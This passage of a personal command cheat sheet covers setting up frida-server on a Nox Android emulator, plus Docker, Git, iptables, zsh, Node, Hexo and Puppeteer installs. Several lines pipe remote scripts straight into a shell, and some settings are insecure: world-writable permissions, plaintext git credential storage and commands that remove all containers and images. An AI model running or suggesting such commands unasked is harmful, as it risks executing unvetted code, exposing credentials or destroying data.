pip install frida-server

Check a version of frida after to install frida-server
frida --version (e.g 12.9.7)

And Check an information of your phone(Nox)-32/64 bit
nox_adb shell
getprop ro.product.cpu.abi (e.g x86)

If you complete to check, Let's go to install a frida-server. Above case, The frida version is 12.9.7 and 32bit. So We able to install from https://github.com/frida/frida/releases/download/12.9.7/frida-server-12.9.7-android-x86.xz

After to install file of frida-server
nox_adb push frida-server-12.9.7-android-x86 /data/local/tmp
nox_adb shell
cd /data/local/tmp; ls
 > frida-server-12.9.7-android-x86

Finally, Execute a frida server
chmod 777 frida-server-12.9.7-android-x86
./frida-server-12.9.7-android-x86 &

Connect to server using the frida
frida-ps -U
```

---
## Docker Command
```
apt-get install docker-ce docker-ce-cli containerd.io
docker -v

docker build --tag <name>:<version> .
docker-compose up
docker-compose up -d
docker exec -it <con-id> /bin/sh

docker images
docker ps

docker stop $(docker ps -a -q)
docker rmi $(docker images)
```

---
## Git Command

```
git init
git add .
git commit -m "test"
git remote add origin <repo url>
git push -u origin main

git config credential.helper store --global
git config credential.helper 'cache --timeout=9999999999'
```

---
## Port Open
```
iptables -I INPUT 1 -p tcp --dport <PORT> -j ACCEPT
```

---
## ZSH Install
```
/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
brew install zsh
chsh -s $(which zsh)
brew install curl
sh -c "$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)"
```

---
## Node Install
```
curl -sL https://deb.nodesource.com/setup_10.x | sudo -E bash -
apt install -y node.js
```

---
## Hexo Install
```
npm install hexo-cli -g
hexo init <your dir name>
cd <your dir name>
npm install

git clone https://github.com/<theme path> themes/<theme name>

pocas : Install the theme, open the config file and change the theme variable

hexo g; hexo d
```

---
## puppeteer setting file Install

```
apt-get install -y gconf-service libasound2 libatk1.0-0 libc6 libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 libgcc1 libgconf-2-4 libgdk-pixbuf2.0-0 libglib2.0-0 libgtk-3-0 libnspr4 libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 ca-certificates fonts-liberation libappindicator1 libnss3 lsb-release xdg-utils wget libgbm1
```
